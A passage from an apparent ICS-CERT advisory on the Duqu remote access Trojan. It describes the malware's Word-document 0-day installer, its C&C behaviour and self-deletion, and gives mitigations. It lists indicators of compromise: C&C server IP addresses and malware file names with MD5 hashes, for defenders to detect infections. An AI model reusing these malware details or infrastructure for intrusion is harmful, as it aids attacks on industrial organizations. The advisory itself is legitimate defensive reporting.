Austria, Hungary, Indonesia, United Kingdom, and Iran. At this point, a comprehensive list of infected organizations is not available. --------- End Update E Part 2 of 4 ---------- However, organizations should still remain vigilant against this and other sophisticated malware. ICS-CERT also recommends that the ICS community update intrusion prevention systems (IPSs) and antivirus systems to detect Duqu and other new threats. ICS-CERT will continue to analyze the malware, monitor the threat landscape, and report additional information as appropriate. ICS-CERT will also continue coordination with Symantec, McAfee, the international community, and ICS stakeholders. On October 18, 2011, Symantec released a Security Response Report 3 describing W32.Duqu, an information-gathering threat targeting specific organizations, including ICSs manufacturers. According to Symantec, W32.Duqu does not contain any code related to ICSs and is primarily a remote access Trojan (RAT). Symantec reports that the original sample of W32.Duqu was gathered from a research organization based in Europe and that additional variants have been recovered from a second organization in Europe. According to Symantec, the attackers are looking for information, such as design documents, that could potentially be used in a future attack on an industrial control facility. This threat is highly targeted toward a limited number of organizations, apparently to exfiltrate data concerning their specific assets; the propagation method is not yet known. Symantec indicates that W32.Duqu is not self-replicating. Symantec reports that other attacks could be ongoing using undetected variants of W32.Duqu. Symantec states that they are continuing to analyze additional variants of W32.Duqu. --------- Begin Update E Part 3 of 4 -------- On November 1, 2011 the researchers, CrySyS, reported they had located the installer being used to infect systems. Symantec has updated their Security Response Report 4 and described the installer as a Microsoft Word document (file extension: .doc) that exploits a previously unknown (0-day) kernel vulnerability. According to the report, Microsoft is working to issue a patch and advisory for this vulnerability. Symantec’s report also indicates that the malicious Word document was specially crafted to target the intended receiving organization. This appears to support the assertion that Duqu was highly targeted. Once infected, attackers can infect other computers in secure zones and control them through a peer-topeer C&C protocol. --------- End Update E Part 3 of 4 ---------- Key points from the report include: The executables share some code with the Stuxnet worm, and they were compiled after the last Stuxnet sample was recovered. There is no ICS specific attack code in the Duqu or infostealer. The primary infection vector for Duqu deployment has not yet been discovered/recovered (Duqu does not self-replicate or  spread on its own). The targeted organizations appear to be limited. The malware employed a valid digital certificate (revoked as of October 14, 2011). The malware is designed to self-delete after 36 days. The Command and Control (C&C) servers are hosted in India (Specific IPs unknown at this time). McAfee Labs 5 has also published a blog entry on the Duqu malware. ICS-CERT has reached out to Symantec and McAfee to obtain additional information to assess the threat and identify mitigations that manufacturers and asset owners can employ to reduce their risk to this new threat. ICS-CERT will publish more information as it becomes available. On October 25, 2011, Kaspersky Labs released an article entitled “ The Mystery of Duqu: Part Two ” in which four additional Duqu infections were detected on their security network: one system in Sudan and three in Iran. In addition, Kaspersky Labs has reported that the name and size of the driver file in the infections they analyzed differs from the previously reported file making it difficult for antivirus software to detect it. As of October 26, 2011, neither Kaspersky Labs nor ICS-CERT has copies of the new files making a full set of new indicators impossible to determine at this time. In addition, it is possible that the malware authors will continue to craft new variants to avoid detection. Possbile Indicators Duqu uses HTTP and HTTPS to communicate with a C&C server at 206.183.111.97. 6 This server is located in India and has been disabled by the ISP. ICS-CERT strongly recommends that organizations check network and proxy logs for any communication with this IP address. If any communication is identified, please contact ICS-CERT for further guidance. --------- Begin Update E Part 4 of 4-------- Symantec has identified a new C&C server that is hosted in Belgium. The IP address reported is 77.241.93.160. This C&C server has been disabled by the hosting provider. Symantec has provided sample names and hashes for the files identified as part of this threat. Additional indicators from Contagio and Kaspersky are also listed below: File Name MD5 Hash cmi4432.pnf 0a566b1616c8afeef214372b1a0580c7 netp192.pnf 94c4ef91dfcd0c53a96fdc387f9f9c35 cmi4464.PNF e8d6b4dadb96ddb58775e6c85b10b6cc netp191.PNF b4ac366e24204d821376653279cbad86 cmi4432.sys 4541e850a228eb69fd0f0e924624b245 jminet7.sys 0eecd17c6c215b358b7b872b74bfd800 Infostealer 9749d38ae9b9ddd81b50aad679ee87ec --------- End Update E Part 4 of 4 ---------- The Contagio website 7 has also provided two new additional indicators as part of this threat. File Name MD5 Hash adpu321.sys 3d83b077d32c422d6c7016b5083b9fc2 nfrd965.sys C9A31EA148232B201FE7CB7DB5C75F5E --------- End Update D Part 3 of 4 ----------", "title": "W32.Duqu-Malware (Update E)", "MITIGATION": "The full extent of the threat posed by W32.Duqu is currently being evaluated. At this time, no specific mitigations are available; however, organizations should consider taking defensive measures against this threat. Specifically, ICS-CERT encourages organizations to: Update antivirus definitions for detection of the Duqu Trojan. Minimize network exposure for all control system devices. Critical devices should not directly face the Internet. Locate control system networks and remote devices behind firewalls, and isolate them from the business network. When remote access is required, use secure methods, such as Virtual Private Networks (VPNs), recognizing that VPN is only as secure as the connected devices. --------- Begin Update D Part 4 of 4 -------- With new variants of Duqu reported on October 25, 2011, by Kaspersky Labs, 8 Monitor for new and unknown services running on client machines. current antivirus software may not be able to identify all variants of this malware. Organizations should consider adding the following items to their network security plans: Monitor systems on their network for new files added to system directories such as system32, and system32\drivers. Monitor for network traffic anomalies; such as: Beaconing to unknown IP addresses Spikes in traffic Outgoing binary files such as jpg HTTP and HTTPS traffic from machines that do not have browsers installed. --------- End Update D Part 4 of 4 ---------- Although the method of propagation has yet to be determined, the targeted nature of the thread would make social engineering a likely method of attack. ICS-CERT recommends that users take the following measures to protect themselves from social engineering attacks: Do not click web links or open unsolicited attachments in e-mail messages Refer to Recognizing and Avoiding Email Scams for more information on avoiding e-mail scams.
